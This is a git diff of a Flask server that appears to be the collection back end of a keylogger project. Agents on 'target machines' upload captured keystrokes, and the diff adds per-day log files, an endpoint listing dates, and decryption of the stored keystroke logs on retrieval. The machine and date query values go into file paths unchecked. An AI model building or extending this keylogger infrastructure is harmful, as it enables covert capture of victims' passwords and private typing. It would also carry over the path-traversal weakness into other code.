@@ -1,5 +1,7 @@
 from flask import Flask, request, jsonify
 import os
+from key_logger.keylogger_agent.encryption import Encryptor
+from key_logger.keylogger_agent.config import Config
 from datetime import datetime
 from flask_cors import CORS
 
@@ -33,15 +35,14 @@ def upload():
     log_data = data["data"]
 
     # יצירת תיקייה עבור מכונה אם לא קיימת
+    date_str = datetime.now().strftime("%Y-%m-%d")
     machine_folder = os.path.join(DATA_FOLDER, machine)
-    if not os.path.exists(machine_folder):
-        os.makedirs(machine_folder)
+    os.makedirs(machine_folder, exist_ok=True)
 
-    # יצירת שם קובץ חדש לפי זמן
-    file_path = os.path.join(machine_folder, "log.txt")
-    # כתיבה לקובץ
+    file_path = os.path.join(machine_folder, f"log_{date_str}.txt")
     with open(file_path, "a", encoding="utf-8") as f:
-        f.write(log_data + "\n" + "="*50 + "\n")
+        f.write(log_data + "\n")
+
 
     return jsonify({"status": "success", "file": file_path}), 200
 
@@ -57,16 +58,11 @@ def get_target_machines_list():
         return jsonify(machines), 200
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+    
 
-
-# ✅ שלב 5: API להחזרת נתוני הקשות של מכונה מסוימת
-
-@app.route('/api/get_keystrokes', methods=['GET'])
-def get_keystrokes():
+@app.route('/api/get_dates', methods=['GET'])
+def get_dates():
     machine = request.args.get("machine")
-    date = request.args.get("date")  # פורמט: YYYY-MM-DD
-    time_str = request.args.get("time")  # פורמט: HH:MM
-
     if not machine:
         return jsonify({"error": "Missing 'machine' parameter"}), 400
 
@@ -74,31 +70,35 @@ def get_keystrokes():
     if not os.path.exists(machine_folder):
         return jsonify({"error": "Machine not found"}), 404
 
-    file_path = os.path.join(machine_folder, "log.txt")
+    files = [f for f in os.listdir(machine_folder) if f.startswith("log_")]
+    dates = [f.replace("log_", "").replace(".txt", "") for f in files]
+    return jsonify(dates), 200
+
+
+
+# ✅ שלב 5: API להחזרת נתוני הקשות של מכונה מסוימת
+
+@app.route('/api/get_keystrokes', methods=['GET'])
+def get_keystrokes():
+    encryptor = Encryptor(Config.ENCRYPTION_KEY)
+    machine = request.args.get("machine")
+    date = request.args.get("date")
+    if not machine or not date:
+        return jsonify({"error": "Missing parameters"}), 400
+
+    file_path = os.path.join(DATA_FOLDER, machine, f"log_{date}.txt")
     if not os.path.exists(file_path):
         return jsonify({"machine": machine, "logs": []}), 200
 
-    # קריאת קובץ
     with open(file_path, "r", encoding="utf-8") as f:
-        logs = f.read().split("="*50)
-
-    # סינון לפי תאריך ושעה אם נשלחו
-    filtered_logs = []
-    for log_entry in logs:
-        if not log_entry.strip():
-            continue
-        if date:
-            if f"[{date}" not in log_entry:
-                continue
-        if time_str:
-            if f"{time_str}" not in log_entry:
-                continue
-        filtered_logs.append(log_entry.strip())
+        logs = [encryptor.decrypt(line.strip()) for line in f if line.strip()]
 
     return jsonify({
         "machine": machine,
-        "logs": filtered_logs
+        "date": date,
+        "logs": logs
     }), 200
+
 
 
 if __name__ == '__main__':
